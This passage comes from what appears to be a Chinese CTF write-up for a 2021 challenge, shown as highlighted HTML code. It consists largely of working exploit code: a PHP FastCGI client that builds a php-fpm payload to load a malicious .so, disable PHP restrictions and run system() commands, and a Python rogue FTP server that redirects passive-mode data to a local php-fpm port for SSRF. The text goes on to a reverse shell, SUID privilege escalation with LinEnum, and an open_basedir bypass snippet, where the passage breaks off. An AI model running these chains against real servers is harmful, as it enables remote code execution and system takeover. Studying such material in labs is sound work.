single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getValues</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'?file=ftp://ip:9999/&amp;data='</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token punctuation">.</span><span class="token single-quoted-string string">'?'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token comment">// php payload -- Doesnt do anything</span><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span> <span class="token comment">// extension_dir即为.so文件所在目录</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token single-quoted-string string">'GATEWAY_INTERFACE'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REQUEST_METHOD'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'POST'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SCRIPT_FILENAME'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SCRIPT_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'QUERY_STRING'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REQUEST_URI'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'DOCUMENT_URI'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token shell-comment comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token single-quoted-string string">'PHP_VALUE'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_SOFTWARE'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REMOTE_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REMOTE_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'9001'</span><span class="token punctuation">,</span> <span class="token comment">// 找准服务端口</span>    <span class="token single-quoted-string string">'SERVER_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'80'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_PROTOCOL'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'CONTENT_LENGTH'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问拿到payload</p><img src="/article/bluehat2021/image-20210503143546020.png" class="" title="fastpayload" loading="lazy"><h3 id="利用-ftp-与-php-fpm-对话-RCE"><a href="#利用-ftp-与-php-fpm-对话-RCE" class="headerlink" title="利用 ftp 与 php-fpm 对话 RCE"></a>利用 ftp 与 php-fpm 对话 RCE</h3><p>众所周知，如果可以将任意二进制数据包发送到 php-fpm 服务，则可以执行代码。 此技术通常与 <code>gopher://</code> 协议结合使用（ssrf），该协议受 curl 支持，<strong>但不受 php 支持</strong>。</p><p> <a href="https://www.php.net/manual/zh/wrappers.php#wrappers">php支持的协议和封装协议</a> 可代替发二进制包的协议只有<code>ftp://</code> ，况且 ftp 本身也是基于 tcp 的服务，能配合 php-fpm 进行 tcp 通信。</p><blockquote><p><strong>ftp 的两种传输模式</strong></p><p>ftp 有两种使用模式：主动模式（port）和被动模式（pasv）。</p><p>port 要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题，连接有时候会被客户端的防火墙阻止。所以，创立了 pasv 。pasv 只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</p><p>ftp 客户端和服务器之间需要建立两条 tcp 连接，一条是控制连接（ 21 端口），用来发送控制指令，另外一条是数据连接（ 20 端口 / 随机端口），真正的文件传输是通过数据连接来完成的。</p><p><strong>两种传输模式的异同</strong></p><p>对于两种传输模式来说，控制连接的建立过程都是一样，均为服务器监听 21 号端口，客户端向服务器的该端口发起 tcp 连接。</p><p>两种传输模式的不同之处体现在数据连接的建立，对于数据连接的建立，主被动模式的不同在于数据连接的建立“服务器”是“主动”还是”被动”：</p><p>port 服务器通过控制连接知道客户端监听的端口后，使用自己的 20 号端口作为源端口，服务器“主动”发起 tcp 数据连接。</p><p>pasv 服务器监听 1024-65535 的一个随机端口，并通过控制连接将该端口告诉客户端，客户端向服务器的该端口发起 tcp 数据连接，这种情况下数据连接的建立相当于服务器是“被动”的。</p><img src="/article/bluehat2021/t012739ba782705dcdd.jpg" class="" title="ftp" loading="lazy"><p>如图，对于我们这题，显然只能用 pasv 模式，服务器监听的“随机端口”对应 php-fpm 监听的 9000 端口，详细过程我们通过一个实际的 pasv 例子来理解：</p><pre class="language-none"><code class="language-none">testbox1: &#123;&#x2F;home&#x2F;p-t&#x2F;slacker&#x2F;public_html&#125; % ftp -d testbox2Connected to testbox2.slacksite.com.220 testbox2.slacksite.com FTP server ready.Name (testbox2:slacker): slacker---&gt; USER slacker331 Password required for slacker.Password: TmpPass---&gt; PASS XXXX230 User slacker logged in.---&gt; SYST215 UNIX Type: L8Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; passivePassive mode on.ftp&gt; lsftp: setsockopt (ignored): Permission denied---&gt; PASV227 Entering Passive Mode (192,168,150,90,195,149).---&gt; LIST150 Opening ASCII mode data connection for file listdrwx------   3 slacker    users         104 Jul 27 01:45 public_html226 Transfer complete.ftp&gt; quit---&gt; QUIT221 Goodbye.</code></pre><p>以上是客户端 testbox1.slacksite.com (192.168.150.80) 发出 <code>PASV</code> 命令以指示其将等待服务器 testbox2.slacksite.com (192.168.150.90) “被动地”提供 ip 和端口号，然后客户端将创建到服务器的数据连接，其中：</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (192,168,150,90,195,149).</code></pre><p>这就是服务器“被动”返回的 ip 和端口号，分别是 32 位的主机地址和 16 位 tcp 端口地址，这个例子的就是 192.168.150.90 的 195*256 + 149 = 50069 端口。</p><p>选择 ip 地址和端口号后，选择 ip 地址和端口的一方将开始侦听指定的地址/端口，并等待另一方连接。 当对方连接到收听方后，数据传输开始。</p><p>我们这题需要将 ip 端口重定向为 127.0.0.1:9000 来试图 ssrf ，9000 % 256 = 40 ，即可表达为：</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (127,0,0,1,35,40).</code></pre></blockquote><p><code>file_put_contents()</code> 用 <code>ftp://</code> 与我们的恶意服务器建立控制连接，使目标发送 <code>PASV</code> 命令，我们“被动”提供 ip 端口至本地 9001端口，然后建立起数据连接，将 data （fastcgi payload）的内容打到FastCGI服务</p><p>在<code>/var/www/html</code>目录写文件<code>file.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token single-quoted-string string">'/tmp/file'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token single-quoted-string string">':)'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// echo file_get_contents($file);</span></span></code></pre><p>准备利用前面生成的payload打</p><h3 id="起恶意ftp服务"><a href="#起恶意ftp服务" class="headerlink" title="起恶意ftp服务"></a>起恶意ftp服务</h3><p>用如下脚本，在公网vps起</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2) 注意打到9001端口的服务</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="干"><a href="#干" class="headerlink" title="干"></a>干</h3><p>干就完事了，访问<code>file.php</code>用payload打</p><p><code>./file.php?file=ftp://vps:9999/&amp;data=xxx</code></p><img src="/article/bluehat2021/image-20210503144504813.png" class="" title="gan" loading="lazy"><p>可以看到dump出来<code>int(681)</code>，这里就是打的数据包大小</p><p>这时已经突破open_basedir，可以任意访问目录了，同时也执行了恶意.so文件</p><img src="/article/bluehat2021/image-20210503144951807.png" class="" title="ls&#x2F;" loading="lazy"><p>下面就是suid提权了，那么大一个700 flag就在眼前</p><h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><p>既然可以执行恶意.so文件，那么直接弹个shell回来</p><img src="/article/bluehat2021/image-20210503145246770.png" class="" title="shell" loading="lazy"><p>在web shell上传自动化提权探测脚本，这里用的是<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>，执行脚本，这里上传到哪都可以，毕竟已经突破了限制还弹了shell</p><pre class="language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;LinEnum.sh -s -r report -e &#x2F;tmp&#x2F; -t</code></pre><p>查看report</p><img src="/article/bluehat2021/image-20210503145518039.png" class="" title="report" loading="lazy"><p>没想到php就有s权限，直接运行即可</p><p>写文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span 